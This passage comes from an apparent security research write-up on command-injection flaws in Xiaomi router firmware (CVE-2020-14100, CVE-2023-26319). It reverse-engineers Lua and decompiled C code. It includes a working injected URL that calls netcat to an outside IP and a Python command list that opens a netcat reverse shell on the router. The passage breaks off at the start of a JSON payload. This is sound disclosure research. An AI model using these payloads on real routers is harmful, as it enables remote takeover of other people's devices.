</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> str:gsub(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                  :gsub(<span style=color:#e6db74>&#34;`&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>`&#34;</span>)
</span></span><span style=display:flex><span>                  :gsub(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\&#34;</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                  :gsub(<span style=color:#e6db74>&#34;%$&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>$&#34;</span>)
</span></span><span style=display:flex><span>                  :gsub(<span style=color:#e6db74>&#34;%&amp;&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&amp;&#34;</span>)
</span></span><span style=display:flex><span>                  :gsub(<span style=color:#e6db74>&#34;%|&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>|&#34;</span>)
</span></span><span style=display:flex><span>                  :gsub(<span style=color:#e6db74>&#34;%;&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Plagued by a shell command injection, the <code>dns1</code> variable can be populated with <code>\n</code> (<code>0x0a</code> in hex) to add arbitrary commands. Indeed, <code>\n</code> bypasses the security checks done by the function <code>XQSecureUtil.parseCmdline</code>. For instance, the following payload injected in the API URL makes a <code>netcat</code> connection request on IP <code>192.168.31.161</code> and port <code>8282</code>: <code>dns1=anything%0anc 192.168.31.161 8282</code></p><p>Example URL: <code>http://192.168.31.1/cgi-bin/luci/;stok=3ab3ea7324a1eb604be37dff197cf504/api/xqnetwork/set_wan6?wanType=native&amp;dns1=anything%0anc%20192.168.31.161%208282</code></p><p>We can execute any command on the router, with some limitations. Certain characters are escaped with a backslash, but we can then just run a <code>sed</code> to remove the backslash to &ldquo;de-escape&rdquo; the characters. For instance, the following list of commands pops a reverse shell on the router:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>commands <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;rm -f /tmp/f&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;mknod /tmp/f p&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;echo &#39;cat /tmp/f|sh -i 2&gt;&amp;1|nc </span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>PORT<span style=color:#e6db74>}</span><span style=color:#e6db74> &gt;/tmp/f&#39; &gt; revshell.sh&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;sed -i </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>s/</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>//g</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74> revshell.sh&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sh revshell.sh&#34;</span>
</span></span><span style=display:flex><span>]
</span></span></code></pre></div><p>Thus, we have a reverse shell on the router:</p><p><a href=/posts/img/xiaomi-routers/setwan6_rce.png target=_blank><img src=/posts/img/xiaomi-routers/setwan6_rce.png alt=RCE></a></p><p>This vulnerability is in fact a duplicate of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14100">CVE-2020-14100</a> and we rediscovered it by accident. But we now have our first root reverse shell on the router with no restriction on the entire filesystem, great!</p><h4 id=endpoint-apixqsmarthomerequest_smartcontroller---command-injection-cve-2023-26319>Endpoint <code>/api/xqsmarthome/request_smartcontroller</code> - Command Injection (CVE-2023-26319)</h4><p>The post-authorization API endpoint <code>/api/xqsmarthome/request_smartcontroller</code>, which seeks to interact with smart-home devices on the network, is implemented in <code>/usr/lib/lua/luci/controller/api/xqsmarthome.lua</code> and accepts the url parameter <code>payload</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>index</span>()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> page   <span style=color:#f92672>=</span> node(<span style=color:#e6db74>&#34;api&#34;</span>,<span style=color:#e6db74>&#34;xqsmarthome&#34;</span>)
</span></span><span style=display:flex><span>    page.target  <span style=color:#f92672>=</span> firstchild()
</span></span><span style=display:flex><span>    page.title   <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    page.order   <span style=color:#f92672>=</span> <span style=color:#ae81ff>500</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>-- We have to be authenticated to access this API</span>
</span></span><span style=display:flex><span>    page.sysauth <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span>    page.sysauth_authenticator <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jsonauth&#34;</span>
</span></span><span style=display:flex><span>    page.index <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>}, firstchild(), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>500</span>)
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request&#34;</span>}, call(<span style=color:#e6db74>&#34;tunnelSmartHomeRequest&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>501</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e>-- API endpoint `request_smartcontroller` is defined here </span>
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_smartcontroller&#34;</span>}, call(<span style=color:#e6db74>&#34;tunnelSmartControllerRequest&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>502</span>)
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_miio&#34;</span>}, call(<span style=color:#e6db74>&#34;tunnelMiioRequest&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>503</span>)
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_mitv&#34;</span>}, call(<span style=color:#e6db74>&#34;requestMitv&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>504</span>)
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_yeelink&#34;</span>}, call(<span style=color:#e6db74>&#34;tunnelYeelink&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>505</span>)
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_camera&#34;</span>}, call(<span style=color:#e6db74>&#34;requestCamera&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>506</span>)
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_miiolist&#34;</span>}, call(<span style=color:#e6db74>&#34;requestMiioList&#34;</span>), _(<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>507</span>) 
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>tunnelSmartControllerRequest</span>()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> XQLog <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;xiaoqiang.XQLog&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> XQCryptoUtil <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;xiaoqiang.util.XQCryptoUtil&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> LuciJson <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;json&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> http_data <span style=color:#f92672>=</span> LuciJson.decode(LuciHttp.formvalue(<span style=color:#e6db74>&#34;payload&#34;</span>))
</span></span><span style=display:flex><span>    <span style=color:#75715e>-- Our `payload` is base64 encoded</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> payload <span style=color:#f92672>=</span> XQCryptoUtil.binaryBase64Enc(LuciHttp.formvalue(<span style=color:#e6db74>&#34;payload&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> cmd <span style=color:#f92672>=</span> XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER <span style=color:#f92672>%</span> payload
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>local</span> LuciUtil <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;luci.util&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e>-- Some command containing our `payload` is executed here</span>
</span></span><span style=display:flex><span>    LuciHttp.write(LuciUtil.exec(cmd))
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Here we can see that our <code>payload</code> will be base64 encoded and then formatted into the string <code>XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER</code> and that the result will be executed with <code>LuciUtil.exec</code>. Let&rsquo;s take a look at the value of <code>XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER</code> in <code>/usr/lib/lua/xiaoqiang/common/XQConfigs.lua</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>THRIFT_TUNNEL_TO_DATACENTER <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 0 &#39;%s&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TUNNEL_TO_SMARTHOME <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 1 &#39;%s&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 2 &#39;%s&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TO_MQTT_IDENTIFY_DEVICE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 3 &#39;&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TO_MQTT_GET_SN <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 4 &#39;&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TO_MQTT_GET_DEVICEID <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 5 &#39;&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TUNNEL_TO_MIIO <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 6 &#39;%s&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TUNNEL_TO_YEELINK <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 7 &#39;%s&#39;&#34;</span>
</span></span><span style=display:flex><span>THRIFT_TUNNEL_TO_CACHECENTER <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;thrifttunnel 8 &#39;%s&#39;&#34;</span>
</span></span></code></pre></div><p>This <code>payload</code> will thus be passed to the binary <code>thrifttunnel</code> by executing the command: <code>thrifttunnel 2 '[BASE64 PAYLOAD]'</code>.</p><p>While taking a look at the <code>thrifttunnel</code> binary, we can see that the choice <code>2</code> will &ldquo;transfer&rdquo; the payload to a service called <code>smartcontroller</code> through the <code>ubus</code> IPC system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// _ftext is basically the main function of the `thrifttunnel` binary
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>_ftext</span>(<span style=color:#66d9ef>int32_t</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> argv, <span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> envp) {
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>uloop_init</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> _ubus_ctx <span style=color:#f92672>=</span> <span style=color:#a6e22e>ubus_connect</span>(data_412050);
</span></span><span style=display:flex><span>        ubus_ctx <span style=color:#f92672>=</span> _ubus_ctx;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> ubus_id;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_ubus_ctx <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>uloop_fd_add</span>((_ubus_ctx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2c</span>), <span style=color:#ae81ff>9</span>);
</span></span><span style=display:flex><span>            ubus_id <span style=color:#f92672>=</span> <span style=color:#a6e22e>ubus_lookup_id</span>(ubus_ctx, <span style=color:#e6db74>&#34;smartcontroller&#34;</span>, <span style=color:#ae81ff>0x412074</span>);
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (ubus_id <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>blob_buf_init</span>(<span style=color:#ae81ff>0x41205c</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>blobmsg_add_field</span>(<span style=color:#ae81ff>0x41205c</span>, <span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;request&#34;</span>, s2_1, (<span style=color:#a6e22e>strlen</span>(s2_1) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>));
</span></span><span style=display:flex><span>                s0_4 <span style=color:#f92672>=</span> nullptr;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>int32_t</span> v0_19 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ubus_invoke_fd</span>(ubus_ctx, data_412074, <span style=color:#e6db74>&#34;process_request&#34;</span>, data_41205c, <span style=color:#ae81ff>0x400f00</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x1388</span>, <span style=color:#ae81ff>0xffffffff</span>);
</span></span><span style=display:flex><span>                a0_11 <span style=color:#f92672>=</span> ubus_ctx;
</span></span><span style=display:flex><span>    [...]
</span></span></code></pre></div><p>We can simplify this process by saying that the payload is finally passed as an argument to the <code>/usr/sbin/smartcontroller</code> binary.</p><p>While looking for vulnerabilities in this <code>smartcontroller</code> binary, we noticed that a command injection is possible through a <code>mac</code> parameter and could allow remote code execution if it could be reached. This vulnerability is located in the function at <code>0x4061d4</code> which we renamed <code>run_sysapi_macfilter</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>run_cmd</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> cmd)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_empty_str</span>(cmd) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>log</span>(<span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#34;system command: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cmd);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> system_res;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> a2_2;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Command executed using the `sytem()` function
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        system_res <span style=color:#f92672>=</span> <span style=color:#a6e22e>system</span>(cmd);
</span></span><span style=display:flex><span>        ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (system_res <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>log</span>(<span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#34;system call error</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a2_2);
</span></span><span style=display:flex><span>            ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// the `mac` parameter is user controlled
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>run_sysapi_macfilter</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> mac, <span style=color:#66d9ef>int32_t</span> enabled)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span> yes_no;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> cmd_buffer[<span style=color:#ae81ff>0x64</span>];
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>cmd_buffer, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x64</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (enable <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        yes_no <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;no&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        yes_no <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;yes&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>sprintf</span>(<span style=color:#f92672>&amp;</span>cmd_buffer,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit&#34;</span>,
</span></span><span style=display:flex><span>            mac,
</span></span><span style=display:flex><span>            a3);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// `mac` is directly injected into `system()`!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>run_cmd</span>(<span style=color:#f92672>&amp;</span>cmd_buffer);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Since the <code>mac</code> parameter is user-controlled and directly passed to <code>run_cmd</code>, we could execute any command on the router, but we first need to understand how to interact correctly with the <code>smartcontroller</code> binary to reach this interesting function.</p><p>While reversing the <code>smartcontroller</code> binary, we can see that the payload must be formatted as JSON with a &ldquo;command&rdquo; field. We can see the different possible commands in a function we named <code>scene_command_parser</code> at <code>0x401dc0</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>scene_command_parser</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> command)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> json_object;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> a2;
</span></span><span style=display:flex><span>    json_object <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_tokener_parse</span>(command);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span><span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span> error_msg;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (json_object <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        error_msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;request is not a json object</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> cmd_json_object;
</span></span><span style=display:flex><span>        cmd_json_object <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_object_object_get</span>(json_object, <span style=color:#e6db74>&#34;command&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (cmd_json_object <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int32_t</span> cmd_string <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_object_get_string</span>(cmd_json_object);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int32_t</span> s0_3;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int32_t</span> v0_11;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_setting&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>int32_t</span> v0_12;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>int32_t</span> a2_6;
</span></span><span style=display:flex><span>                v0_12 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;get_scene_setting&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (v0_12 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;get_single_scene_setting&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                    {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;get_multiple_scene_setting&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                        {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_update&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                            {
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_start&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                {
</span></span><span style=display:flex><span>                                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_stop&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                    {
</span></span><span style=display:flex><span>                                        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_launch&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                        {
</span></span><span style=display:flex><span>                                            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_launch_delete&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                            {
</span></span><span style=display:flex><span>                                                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_delete&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                                {
</span></span><span style=display:flex><span>                                                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_start_by_device_status&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                                    {
</span></span><span style=display:flex><span>                                                        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;is_scene_processing&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                                        {
</span></span><span style=display:flex><span>                                                            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;get_scene_count&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                                            {
</span></span><span style=display:flex><span>                                                                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;reset_scenes&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                                                {
</span></span><span style=display:flex><span>                                                                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(cmd_string, <span style=color:#e6db74>&#34;scene_start_by_crontab&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>                                                                    {
</span></span></code></pre></div><blockquote><p>For those of you who are really paying attention, we can see here that the <code>strcmp</code> returns 0 if the strings are not equal, which is the opposite of what normally happens: this is because the <code>strcmp</code> used here is a custom implementation.</p></blockquote><p>In this same function, we can see the only cross-reference to the function <code>run_sysapi_macfilter</code> that is interesting for us, in the case of the command &ldquo;scene_setting&rdquo;.</p><p>After a little more reverse engineering of the command parsing process, we built the following payload for the API <code>/api/xqsmarthome/request_smartcontroller</code> that can then be used to POC the RCE by creating a new &ldquo;scene&rdquo; with the command <code>scene_setting</code> that will block a MAC address - which will, in fact, be our command injection payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
